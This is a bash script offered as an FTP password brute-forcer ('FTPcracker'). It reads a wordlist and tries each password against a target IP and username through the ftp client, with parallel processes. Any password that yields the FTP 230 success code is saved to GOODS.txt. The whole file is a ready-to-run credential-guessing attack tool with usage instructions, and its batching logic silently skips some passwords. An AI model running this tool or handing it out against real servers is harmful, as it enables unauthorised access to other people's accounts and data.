#!/bin/bash
# A simple bash FTP brute-forcer. Written by Darcy. https://github.com/D4R30

# function for sending the login credentials to the specified server.
testpass () {
ans=`ftp -nv $1 <<EOF
quote USER "$2"
quote PASS "$3"
EOF
`
	good=$(echo $ans | grep ' 230 ')
	if [ $? == 0 ]
	then
		echo -e "\033[91mPassword Found: $3"
		echo "Password found for IP $1, username $2: $3" >> GOODS.txt
		kill -9 $$
	else
		return 1
	fi
}

printhelp () {
	echo "
	
	Usage:

  	./FTPcracker IP USERNAME PASSWORD_LIST NumberOfProceses

  IP: The target's IP address.
  USERNAME: The target's login username.
  PASSWORD_LIST: Wordlist file address.
  NumberOfProcess: Number of process to generate for accelerating brute-force.(Enter 0 for none)

	Example:
		FTPcracker 192.168.1.1 admin pass_list.txt 5
	
	"
}

if [ $1 == 'help' ]
then
		printhelp
fi

if [ $# != 4 ]
then

	printhelp
	exit
fi

IP=$1
USERNAME=$2
PASSWORD_ADDR=$3

if [ $4 -eq 0 ]
then
  process_num=5
else
  process_num=$4
fi

if [ ! -r $PASSWORD_ADDR ]
then
	echo 'File does not exist or read permission is not granted.'
	exit
fi

count_password=`wc -l $PASSWORD_ADDR`
echo "Found $count_password passwords. Starting the attack."

count_tested=0
count=0
while read passwd
do

	echo -e "\033[92mTesting $passwd."
	if [ $count -lt $process_num ]
	then
		( testpass $IP $USERNAME $passwd & )
    # Increasing the tally of tested passwords.
		((count++))
		((count_tested++))
	else
		echo "Tested $count_tested passwords from $count_password passwords."
		sleep 4
		count=0
	fi

done < $PASSWORD_ADDR
echo "Password list finished."
